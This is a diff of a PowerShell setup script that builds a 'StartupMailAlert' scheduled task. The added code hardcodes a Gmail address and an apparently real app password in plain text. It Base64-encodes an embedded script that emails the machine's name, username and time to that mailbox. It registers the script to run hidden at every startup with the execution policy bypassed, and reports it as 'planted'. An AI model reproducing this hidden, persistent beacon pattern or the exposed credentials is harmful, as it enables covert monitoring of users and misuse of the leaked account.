@@ -280,100 +280,108 @@ catch {
 # STARTUP EMAIL ALERT TASK
 # =========================================================
 
-try {
+$f = "systemaccess91@gmail.com"
+$t = "systemaccess91@gmail.com"
+$appPassword = "hmyguhczrnrzmzce"
 
-    $gmailSender = "systemaccess91@gmail.com"
-    $gmailReceiver = "systemaccess91@gmail.com"
-    $gmailAppPassword = "hmyguhczrnrzmzce"
+# ---------------------------------------------------------
+# Embedded startup script
+# ---------------------------------------------------------
 
-    $startupScript = @'
-$connected = $false
-
-do {
-    Start-Sleep -Seconds 10
-
-    try {
-        $connected = Test-Connection google.com -Count 1 -Quiet
-    }
-    catch {
-        $connected = $false
-    }
-
-} until ($connected)
-
-$username = $env:USERNAME
-$computer = $env:COMPUTERNAME
+$script = @"
+Start-Sleep -Seconds 20
 
 try {
 
-    $response = Invoke-WebRequest -Uri "https://speed.cloudflare.com/__down?bytes=5000000" -TimeoutSec 30
+    Invoke-WebRequest `
+        -Uri 'https://google.com' `
+        -UseBasicParsing `
+        -TimeoutSec 15 | Out-Null
 
-    $speedMbps = [math]::Round((($response.RawContentLength * 8) / 1MB), 2)
-}
-catch {
-    $speedMbps = "Unknown"
-}
+    `$pw = ConvertTo-SecureString `
+        '$appPassword' `
+        -AsPlainText `
+        -Force
 
-$from = "YOUR_GMAIL@gmail.com"
-$to = "RECEIVER@gmail.com"
+    `$cred = New-Object `
+        System.Management.Automation.PSCredential(
+            '$f',
+            `$pw
+        )
 
-$securePassword = ConvertTo-SecureString "YOUR_APP_PASSWORD" -AsPlainText -Force
-
-$credential = New-Object System.Management.Automation.PSCredential($from, $securePassword)
-
-$body = @"
-System is online.
-
-PC Name: $computer
-Username: $username
-Internet Speed: $speedMbps Mbps
+    `$body = @'
+PC Name: $env:COMPUTERNAME
+Username: $env:USERNAME
 Time: $(Get-Date)
-"@
-
-try {
-
-    Send-MailMessage \
-        -From $from \
-        -To $to \
-        -Subject "PC Online Alert - $computer" \
-        -Body $body \
-        -SmtpServer "smtp.gmail.com" \
-        -Port 587 \
-        -UseSsl \
-        -Credential $credential
-}
-catch {
-}
 '@
 
-    $encodedCommand = [Convert]::ToBase64String(
-        [Text.Encoding]::Unicode.GetBytes($startupScript)
-    )
+    Send-MailMessage `
+        -From '$f' `
+        -To '$t' `
+        -Subject 'PC Online Alert - ' + `$env:COMPUTERNAME `
+        -Body `$body `
+        -SmtpServer 'smtp.gmail.com' `
+        -Port 587 `
+        -UseSsl `
+        -Credential `$cred
 
-    $taskAction = New-ScheduledTaskAction `
-        -Execute "powershell.exe" `
-        -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand $encodedCommand"
-
-    $taskTrigger = New-ScheduledTaskTrigger -AtStartup
-
-    $taskPrincipal = New-ScheduledTaskPrincipal `
-        -UserId "SYSTEM" `
-        -LogonType ServiceAccount `
-        -RunLevel Highest
-
-    Register-ScheduledTask `
-        -TaskName "StartupMailAlert" `
-        -Action $taskAction `
-        -Trigger $taskTrigger `
-        -Principal $taskPrincipal `
-        -Force | Out-Null
-
-    Write-Host "Startup email task configured." -ForegroundColor Green
 }
 catch {
-    Write-Host "Failed creating startup email task: $_" -ForegroundColor Yellow
+}
+"@
+
+# ---------------------------------------------------------
+# Encode command
+# ---------------------------------------------------------
+
+$encoded = [Convert]::ToBase64String(
+    [Text.Encoding]::Unicode.GetBytes($script)
+)
+
+# ---------------------------------------------------------
+# Remove old task
+# ---------------------------------------------------------
+
+try {
+
+    Unregister-ScheduledTask `
+        -TaskName "StartupMailAlert" `
+        -Confirm:$false `
+        -ErrorAction SilentlyContinue
+
+}
+catch {
 }
 
+# ---------------------------------------------------------
+# Create task action
+# ---------------------------------------------------------
+
+$action = New-ScheduledTaskAction `
+    -Execute "powershell.exe" `
+    -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $encoded"
+
+# ---------------------------------------------------------
+# Startup trigger
+# ---------------------------------------------------------
+
+$trigger = New-ScheduledTaskTrigger -AtStartup
+
+# ---------------------------------------------------------
+# Register task as current user
+# Best compatibility across editions
+# ---------------------------------------------------------
+
+Register-ScheduledTask `
+    -TaskName "StartupMailAlert" `
+    -Action $action `
+    -Trigger $trigger `
+    -User $env:USERNAME `
+    -Force | Out-Null
+
+
+Write-Host ""
+Write-Host "StartupMailAlert planted successfully." -ForegroundColor Green
 
 Write-Host "Setup completed." -ForegroundColor Green
 
